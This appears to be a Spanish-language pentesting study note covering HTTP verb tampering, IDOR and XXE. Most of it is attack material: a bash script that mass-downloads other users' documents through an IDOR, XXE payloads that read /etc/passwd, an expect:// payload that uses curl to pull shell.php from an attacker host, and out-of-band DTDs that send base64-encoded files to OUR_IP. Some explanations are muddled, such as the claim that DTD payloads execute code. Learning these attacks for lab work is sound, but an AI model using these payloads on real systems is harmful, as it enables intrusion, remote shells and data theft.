# Other Web Attacks (HTTP verb Tampering, IDOR & XXE)

## HTTP verb tampering

- hay 9 verbos HTTP, los más comunes son:
    - GET
    - POST
    - PUT
    - DELETE
    - PATCH
    - HEAD
    - OPTIONS
    - TRACE
    - CONNECT
- Entonces si una aplicación web no valida los verbos HTTP, se puede hacer un ataque de HTTP verb tampering.
- Un ataque de HTTP verb tampering es un ataque que se basa en la manipulación de los verbos HTTP para realizar acciones no autorizadas.
- Por ejemplo, si una aplicación web permite el uso del verbo DELETE, un atacante podría enviar una solicitud DELETE a un recurso que no debería ser eliminado.
- Para prevenir este tipo de ataques, se deben restringir los verbos HTTP permitidos en la aplicación web.
- O con PUT se puede subir un archivo a un servidor.
- O con TRACE se puede hacer un ataque de Cross-Site Tracing.
- O con CONNECT se puede hacer un ataque de HTTP tunneling, etc etc.

## IDOR (Insecure Direct Object Reference)
- IDOR es una vulnerabilidad de seguridad que se produce cuando una aplicación web expone referencias directas a objetos internos.
- Por ejemplo, si una aplicación web utiliza un parámetro numérico para acceder a un recurso, un atacante podría modificar ese parámetro para acceder a recursos no autorizados.

### Identificando IDORs
- Para identificar IDORs, se pueden seguir los siguientes pasos:
    - Identificar los parámetros que se utilizan para acceder a recursos.
    - Modificar esos parámetros para acceder a recursos no autorizados.
    - Observar si la aplicación web permite el acceso a recursos no autorizados.
#### Llamadas AJAX
- En las llamadas AJAX, se pueden identificar IDORs de la siguiente manera:
    - Inspeccionar las llamadas AJAX en la pestaña Network de las herramientas de desarrollo del navegador.
    - Identificar los parámetros que se utilizan en las llamadas AJAX.
    - Modificar esos parámetros para acceder a recursos no autorizados.
    - Observar si la aplicación web permite el acceso a recursos no autorizados.

### Enumeración masiva con IDORs
- Para realizar una enumeración masiva con IDORs, se pueden seguir los siguientes pasos:
    - Identificar los parámetros que se utilizan para acceder a recursos.
    - Crear una lista de valores posibles para esos parámetros.
    - Automatizar la modificación de esos parámetros para acceder a recursos no autorizados.
    - Observar si la aplicación web permite el acceso a recursos no autorizados.
- Script de ejemplo:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## XXE (XML External Entity)
- XXE es una vulnerabilidad de seguridad que se produce cuando una aplicación web expone un punto de entrada que permite la inclusión de archivos XML externas.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría incluir archivos XML maliciosos en una solicitud POST o GET.

### Identificando XXE
- Para identificar XXE, se pueden seguir los siguientes pasos:
    - Identificar puntos de entrada que permiten la inclusión de archivos XML externas.
    - Verificar si la aplicación web permite la inclusión de archivos XML externas.
    - Verificar si la aplicación web permite la inclusión de archivos XML externas en las solicitudes POST o GET.

### Payloads con SYSTEM
- Para explotar XXE, se pueden utilizar diferentes payloads con SYSTEM.
- Un payload con SYSTEM es un payload que contiene una directiva de sistema que se ejecutará en el servidor.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con SYSTEM para ejecutar código en el servidor.
- Payloads:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>`

### Payloads con DTD
- Para explotar XXE, se pueden utilizar diferentes payloads con DTD.
- Un payload con DTD es un payload que contiene una declaración de tipo de documento (DTD) que se utilizará para validar el documento XML.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con DTD para ejecutar código en el servidor.
- Payloads:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>`

### Identificando XXE
- Primero tenemos que encontrar una petición que permita la inclusión de archivos XML externas.
- Puede ser desde un formulario, una solicitud HTTP, un archivo de configuración, un excel, etc.
- [Payloads list](https://github.com/payloadbox/xxe-injection-payload-list)

### RCE con XXE
- Podemos utilizar el siguiente payload para ejecutar comandos en el servidor:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://ls" >]><foo>&xxe;</foo>`
    - `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`
    - `<!ENTITY % file SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">%file;`

### Filtración con CDATA
- Para filtrar el contenido de una aplicación web, se puede utilizar la directiva CDATA.
- La directiva CDATA se utiliza para filtrar el contenido de una aplicación web.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar la directiva CDATA para filtrar el contenido de la aplicación web.
- Payloads:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
#### Parametros en declaraciones de entidades
- Las declaraciones de entidades pueden contener parámetros que se utilizan para reemplazar valores dinámicos en la declaración de entidad.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar parámetros para reemplazar el contenido de la aplicación web.
- utilizamos `%` para poner parámetros en declaraciones de entidades.
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/SOME-FILE.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:PORT/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
- Desde la maquina atacante tenemos que xxe: `<!ENTITY joined "%begin;%file;%end;">`

### Error based XXE
- Error based XXE es un ataque que se basa en la identificación de errores en la aplicación web.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con DTD para ejecutar código en el servidor.
- Primero tenemos que ver de generar un error xml en la aplicación web.
- Luego podemos tener un DTD así:
```xml	
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Y podemos tener el siguiente payload en la petición
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
## Out of Band XXE (blind XXE)
- Es como una inyección ciega de SQLi, pero en este caso se utiliza un payload de tipo DTD para ejecutar código en el servidor.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload de tipo DTD para ejecutar código en el servidor.
- Pero no vamos a ver ningún output en la aplicación web.
- Podemos tener el siguiente payload:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
y la petición:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## XXE automatizado
- Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
- `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp
```
POST /blind/submitDetails.php HTTP/1.1

Host: 10.129.197.101

Content-Length: 140

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36

Content-Type: text/plain;charset=UTF-8

Accept: */*

Origin: http://10.129.197.101

Referer: http://10.129.197.101/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT```